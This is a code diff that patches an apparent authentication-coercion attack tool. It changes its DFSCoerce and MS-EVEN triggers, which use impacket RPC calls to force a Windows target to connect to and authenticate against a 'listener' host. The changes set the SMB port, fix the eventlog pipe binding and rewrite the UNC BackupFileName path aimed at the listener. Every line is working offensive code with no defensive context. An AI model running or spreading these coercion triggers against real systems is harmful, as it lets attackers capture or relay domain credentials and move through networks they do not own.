@@ -339,6 +339,8 @@ class DFSCoerceTrigger:
             },
         }
         rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
+        rpctransport.set_dport(445)
+
         if hasattr(rpctransport, "set_credentials"):
             rpctransport.set_credentials(
                 username=username,
@@ -910,11 +912,13 @@ class MSEvenTrigger:
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "eventlog": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\lsarpc]" % target,
+                "stringBinding": r"ncacn_np:%s[\PIPE\eventlog]" % target,
                 "MSRPC_UUID_EVEN": ("82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0"),
             },
         }
         rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
+        rpctransport.set_dport(445)
+
         if hasattr(rpctransport, "set_credentials"):
             rpctransport.set_credentials(
                 username=username,
@@ -953,7 +957,7 @@ class MSEvenTrigger:
         try:
             request = even.ElfrOpenBELW()
             request["UNCServerName"] = NULL  # '%s\x00' % listener
-            request["BackupFileName"] = "\\??\\UNC\\{}\\{}".format(listener, "lodos\\2005")
+            request["BackupFileName"] = f"\\??\\UNC\\{listener}\\abcdefgh\\aa"
             request["MajorVersion"] = 1
             request["MinorVersion"] = 1
             dce.request(request)
